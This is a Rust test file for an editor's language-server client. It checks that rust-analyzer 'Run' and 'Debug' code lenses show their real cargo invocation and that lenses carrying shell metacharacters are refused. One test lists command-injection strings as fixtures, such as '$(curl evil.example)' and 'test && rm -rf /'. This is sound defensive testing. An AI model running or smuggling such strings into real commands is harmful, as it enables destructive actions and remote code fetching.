//! P2.F1.T4: a runnable code lens names the command it would run.
//!
//! rust-analyzer publishes "Run" and "Debug" as code lenses. The lens's
//! `command` field holds `rust-analyzer.runSingle`, which is a handle into
//! rust-analyzer's private protocol, not a command — the real invocation lives
//! in the command's `arguments`. Projecting the handle into a field called
//! `command_label` makes the lens describe itself wrongly everywhere it is
//! shown or written to the audit log.
//!
//! What it does **not** do is run anything. `ActivateLanguageCodeLens` and the
//! test explorer both pass the label to `TerminalWorkflow::launch`, which
//! spawns the configured shell and uses the label for display and audit only.
//! Runnables are projected and named correctly; they are not executed. These
//! tests cover the naming and the refusal that keeps the naming safe if
//! execution is ever wired up.

use legion_lsp::project_code_lens_response;
use serde_json::json;

/// A lens shaped the way rust-analyzer actually sends a test runnable.
fn run_test_lens() -> serde_json::Value {
    json!([
        {
            "range": {
                "start": { "line": 4, "character": 0 },
                "end": { "line": 4, "character": 7 }
            },
            "command": {
                "title": "\u{25b6}\u{fe0e} Run Test",
                "command": "rust-analyzer.runSingle",
                "arguments": [
                    {
                        "label": "test my_module::my_test",
                        "kind": "cargo",
                        "args": {
                            "cargoArgs": ["test", "--package", "legion-lsp", "--lib"],
                            "executableArgs": ["my_module::my_test", "--exact", "--nocapture"],
                            "workspaceRoot": "/w"
                        }
                    }
                ]
            }
        }
    ])
}

#[test]
fn a_runnable_lens_projects_the_cargo_invocation_not_the_command_id() {
    let lenses = project_code_lens_response(&run_test_lens(), "rust-analyzer", 10);
    let lens = lenses.first().expect("one lens projected");

    assert_eq!(
        lens.command_label,
        "cargo test --package legion-lsp --lib -- my_module::my_test --exact --nocapture",
        "a field called command_label should hold the command, not a protocol handle"
    );
    assert!(
        !lens.command_label.contains("runSingle"),
        "the LSP command id is a protocol handle, not something to run"
    );
}

/// The kind label is what `ActivateLanguageCodeLens` gates on before it will
/// accept a lens at all.
#[test]
fn a_runnable_lens_is_marked_runnable_so_activation_will_accept_it() {
    let lenses = project_code_lens_response(&run_test_lens(), "rust-analyzer", 10);
    assert!(
        lenses[0].kind_label.contains("runnable"),
        "activation refuses any lens whose kind is not runnable, got {:?}",
        lenses[0].kind_label
    );
}

/// An ordinary lens is left exactly as it was.
#[test]
fn a_non_runnable_lens_keeps_its_command_id_and_its_kind() {
    let payload = json!([
        {
            "range": {
                "start": { "line": 0, "character": 0 },
                "end": { "line": 0, "character": 3 }
            },
            "command": {
                "title": "3 implementations",
                "command": "rust-analyzer.showReferences"
            }
        }
    ]);
    let lenses = project_code_lens_response(&payload, "rust-analyzer", 10);
    let lens = lenses.first().expect("one lens projected");
    assert_eq!(lens.command_label, "rust-analyzer.showReferences");
    assert!(
        !lens.kind_label.contains("runnable"),
        "a lens with no runnable arguments must not become launchable"
    );
}

/// A lens that names itself a runnable but carries no cargo arguments is not
/// one.
///
/// Marking it runnable anyway would advertise a Run action with no command
/// behind it, so the absence of `cargoArgs` falls through to the ordinary path.
#[test]
fn a_runnable_command_without_arguments_is_not_treated_as_runnable() {
    let payload = json!([
        {
            "range": {
                "start": { "line": 0, "character": 0 },
                "end": { "line": 0, "character": 3 }
            },
            "command": {
                "title": "Run",
                "command": "rust-analyzer.runSingle"
            }
        }
    ]);
    let lenses = project_code_lens_response(&payload, "rust-analyzer", 10);
    let lens = lenses.first().expect("one lens projected");
    assert!(
        !lens.kind_label.contains("runnable"),
        "no cargoArgs means no command to run, whatever the lens calls itself"
    );
    assert_eq!(lens.command_label, "rust-analyzer.runSingle");
}

/// A debug lens is a runnable too — `debugSingle` carries the same arguments.
#[test]
fn a_debug_lens_projects_its_cargo_invocation() {
    let payload = json!([
        {
            "range": {
                "start": { "line": 4, "character": 0 },
                "end": { "line": 4, "character": 7 }
            },
            "command": {
                "title": "Debug",
                "command": "rust-analyzer.debugSingle",
                "arguments": [
                    {
                        "args": {
                            "cargoArgs": ["test", "--no-run"],
                            "executableArgs": []
                        }
                    }
                ]
            }
        }
    ]);
    let lenses = project_code_lens_response(&payload, "rust-analyzer", 10);
    assert_eq!(lenses[0].command_label, "cargo test --no-run");
    assert!(
        !lenses[0].command_label.ends_with("--"),
        "an empty executableArgs must not leave a dangling separator"
    );
}

/// A hostile server cannot smuggle a second command into the label.
///
/// The label is not executed today, so this is not a live vulnerability — it is
/// the reason it stays that way if a caller ever does run it. A cargo argument
/// containing a shell metacharacter is not a cargo argument, so the lens falls
/// back to the ordinary path where its command id is displayed and nothing is
/// claimed about it.
#[test]
fn a_runnable_carrying_shell_metacharacters_is_not_treated_as_runnable() {
    for hostile in [
        "test; curl evil.example",
        "test && rm -rf /",
        "test | tee /tmp/x",
        "$(curl evil.example)",
        "`curl evil.example`",
        "test\nrm -rf /",
        "test > /etc/passwd",
        "'quoted'",
    ] {
        let payload = json!([
            {
                "range": {
                    "start": { "line": 0, "character": 0 },
                    "end": { "line": 0, "character": 7 }
                },
                "command": {
                    "title": "Run",
                    "command": "rust-analyzer.runSingle",
                    "arguments": [
                        { "args": { "cargoArgs": [hostile], "executableArgs": [] } }
                    ]
                }
            }
        ]);
        let lenses = project_code_lens_response(&payload, "rust-analyzer", 10);
        let lens = lenses.first().expect("one lens projected");
        assert!(
            !lens.kind_label.contains("runnable"),
            "{hostile:?} must not produce a runnable lens, got {:?}",
            lens.kind_label
        );
        assert_eq!(
            lens.command_label, "rust-analyzer.runSingle",
            "a refused runnable falls back to displaying the command id"
        );
    }
}

/// The refusal must not reject the arguments cargo actually produces.
///
/// A check so strict that real runnables stop working is the same as no
/// feature, and it would fail quietly — a missing Run lens looks like the
/// server not offering one.
#[test]
fn ordinary_cargo_arguments_are_still_accepted() {
    let payload = json!([
        {
            "range": {
                "start": { "line": 0, "character": 0 },
                "end": { "line": 0, "character": 7 }
            },
            "command": {
                "title": "Run Test",
                "command": "rust-analyzer.runSingle",
                "arguments": [
                    {
                        "args": {
                            "cargoArgs": [
                                "test", "--package", "legion-lsp", "--lib",
                                "--features", "a,b", "--target-dir", "target/debug"
                            ],
                            "executableArgs": [
                                "module::nested::test_name", "--exact", "--nocapture"
                            ]
                        }
                    }
                ]
            }
        }
    ]);
    let lenses = project_code_lens_response(&payload, "rust-analyzer", 10);
    assert!(
        lenses[0].kind_label.contains("runnable"),
        "ordinary cargo arguments must survive the check, got {:?}",
        lenses[0].kind_label
    );
    assert!(
        lenses[0]
            .command_label
            .contains("module::nested::test_name")
    );
    assert!(lenses[0].command_label.contains("a,b"));
}
